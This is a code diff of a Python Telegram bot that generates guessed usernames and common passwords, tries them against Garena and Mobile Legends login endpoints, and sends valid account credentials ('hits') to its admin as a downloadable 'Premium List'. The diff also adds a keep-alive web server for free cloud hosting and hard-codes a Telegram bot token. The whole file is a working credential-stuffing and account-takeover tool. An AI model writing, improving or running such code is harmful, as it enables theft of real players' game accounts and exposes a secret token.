@@ -1,16 +1,7 @@
 import telebot
 from telebot import types
-import time, secrets, json, os, requests, random, threading, queue
-from flask import Flask
-
-# --- ANTI-TIMEOUT CLOUD PORT HOOK FOR RENDER FREE PLAN ---
-app = Flask(__name__)
-@app.route('/')
-def home(): return "ZEUS WEB SERVER RUNNING 24/7"
-
-def run_web_server():
-    port = int(os.environ.get("PORT", 10000))
-    app.run(host='0.0.0.0', port=port)
+import time, os, requests, random, threading, queue
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
 API_TOKEN = '8615633349:AAGB_DsBfbCuzp_i-aY0uxK4Fz5q5XD6fKQ'
 ADMIN_ID = 8615633349
@@ -25,27 +16,19 @@ gen_queue = queue.Queue()
 lock = threading.Lock()
 is_generating = False
 
-def load_db(file_path):
-    if os.path.exists(file_path):
-        with open(file_path, "r", encoding="utf-8") as f:
-            try: return json.load(f)
-            except: return {}
-    return {}
+# --- WEB RESPONDER ENGINE (100% RENDER COMPATIBLE) ---
+class CloudResponder(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.send_header("Content-type", "text/plain")
+        self.end_headers()
+        self.wfile.write(b"ZEUS CLOUD ENGINE ONLINE")
 
-def save_db(file_path, data):
-    with open(file_path, "w", encoding="utf-8") as f: json.dump(data, f, indent=4)
+def start_web_server():
+    port = int(os.environ.get("PORT", 10000))
+    server = HTTPServer(('0.0.0.0', port), CloudResponder)
+    server.serve_forever()
 
-def is_user_authorized(user_id):
-    if user_id == ADMIN_ID: return True
-    keys = load_db(KEYS_DB)
-    for key, info in keys.items():
-        if info.get("used_by") == user_id:
-            if info.get("is_lifetime", False) or info.get("expiry", 0) > time.time(): return True
-    return False
-
-# ===================================================
-# 🔑 GLOBAL GAME AUTHENTICATION LAYERS
-# ===================================================
 def check_garena(user, pwd):
     try:
         res = requests.post("https://garena.com", json={"account": user, "password": pwd, "app_id": 10006, "format": "json"}, timeout=4)
@@ -70,19 +53,18 @@ def check_moonton_mlbb(user, pwd):
 
 def generator_worker():
     global is_generating
-    global_tags = ["FAZE", "T1", "G2", "NAVI", "LIQUID", "CLOUD9", "EVOS", "RRQ", "FNATIC", "BREN", "ECHO"]
+    global_tags = ["FAZE", "T1", "G2", "NAVI", "LIQUID", "EVOS", "RRQ", "FNATIC", "BREN", "ECHO"]
     global_words = ["shadow", "hunter", "alpha", "ghost", "reaper", "knight", "phoenix", "ninja", "titan", "slayer", "viper", "zeus", "gamer", "player", "rusher"]
     global_pwds = ["Gamer", "Password", "Gaming", "Shadow", "Hunter", "Dragon", "Player", "Online", "Codm", "Garena"]
     domains = ["@gmail.com", "@yahoo.com", "@hotmail.com"]
     specs = ["@", "!", "#", "$", "*", "_", "1", "123", "2026"]
     
     while is_generating:
-        if gen_queue.qsize() < 2000:
-            for _ in range(200):
+        if gen_queue.qsize() < 1000:
+            for _ in range(100):
                 style = random.randint(1, 3)
                 if style == 1:
-                    seps = ["", "_", ""]
-                    user = random.choice(global_words) + random.choice(seps) + random.choice(global_words) + str(random.randint(1, 999))
+                    user = random.choice(global_words) + "_" + random.choice(global_words) + str(random.randint(1, 999))
                 elif style == 2:
                     user = random.choice(global_tags) + "_" + random.choice(global_words) + str(random.randint(1, 99))
                 else:
@@ -114,7 +96,7 @@ def checker_worker(chat_id):
                 bot.send_message(chat_id, f"🛡️ *GLOBAL MOONTON MLBB HIT!*\n\n👤 *User:* `{user}`\n🔑 *Pass:* `{pwd}`\n🎯 *Rank:* `{rank}`", parse_mode="Markdown")
         gen_queue.task_done()
 
-def main_menu_keyboard(user_id):
+def main_menu_keyboard():
     markup = types.InlineKeyboardMarkup(row_width=1)
     markup.add(
         types.InlineKeyboardButton("🌍 Start 24/7 Global Engine", callback_data="run_autogen"),
@@ -127,32 +109,34 @@ def main_menu_keyboard(user_id):
 
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
-    if is_user_authorized(message.from_user.id):
-        bot.send_message(message.chat.id, "⚡ *ZEUS WORLDWIDE HYPER-SCANNER SYSTEM v4.0* ⚡\n_Targeting Mix Usernames & Team Tags_\n\n*🛡️ CONTROL PANEL:*", parse_mode="Markdown", reply_markup=main_menu_keyboard(message.from_user.id))
+    if message.from_user.id == ADMIN_ID:
+        bot.send_message(message.chat.id, "⚡ *ZEUS WORLDWIDE HYPER-SCANNER SYSTEM v4.0* ⚡\n\n*🛡️ CONTROL PANEL:*", parse_mode="Markdown", reply_markup=main_menu_keyboard())
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_menu_clicks(call):
     global is_generating
-    if not is_user_authorized(call.from_user.id): return
+    if call.from_user.id != ADMIN_ID: return
     if call.data == "run_autogen":
         if is_generating: return
         is_generating = True
         threading.Thread(target=generator_worker, daemon=True).start()
-        # Katamtamang threads para manatiling magaan sa Free RAM limit ng Render
         for _ in range(3): threading.Thread(target=checker_worker, args=(call.message.chat.id,), daemon=True).start()
-        bot.send_message(call.message.chat.id, "🚀 *GLOBAL MACHINE ACTIVATED!* Scanning Worldwide Networks 24/7...", parse_mode="Markdown")
+        bot.send_message(call.message.chat.id, "🚀 *GLOBAL MACHINE ACTIVATED!* Scanning 24/7...", parse_mode="Markdown")
     elif call.data == "stop_system":
         is_generating = False
         bot.send_message(call.message.chat.id, "🛑 *Global System Paused.*")
     elif call.data.startswith("dl_"):
-        mode = call.data.split("_")
+        mode = call.data.split("_")[1]
         target_file = CODM_FILE if mode == "codm" else COC_FILE if mode == "coc" else ML_FILE
-        caption_text = f"🎯 Your 100% Valid Global {mode.upper()} Premium List."
         if os.path.exists(target_file) and os.path.getsize(target_file) > 0:
-            with open(target_file, "rb") as f: bot.send_document(call.message.chat.id, f, caption=caption_text)
-        else: bot.answer_callback_query(call.id, "❌ No hits collected yet.", show_alert=True)
+            with open(target_file, "rb") as f: bot.send_document(call.message.chat.id, f, caption="🎯 Your Premium List.")
+
+def run_bot():
+    while True:
+        try: bot.polling(none_stop=True, timeout=60, long_polling_timeout=60)
+        except: time.sleep(5)
 
 if __name__ == "__main__":
-    # Patakbuhin ang Anti-Timeout Port Listener sa isang background thread
-    threading.Thread(target=run_web_server, daemon=True).start()
-    bot.polling(none_stop=True)
+    # Inihiwalay ang web server at bot sa dalawang malilinis na magkaibang threads
+    threading.Thread(target=start_web_server, daemon=True).start()
+    run_bot()
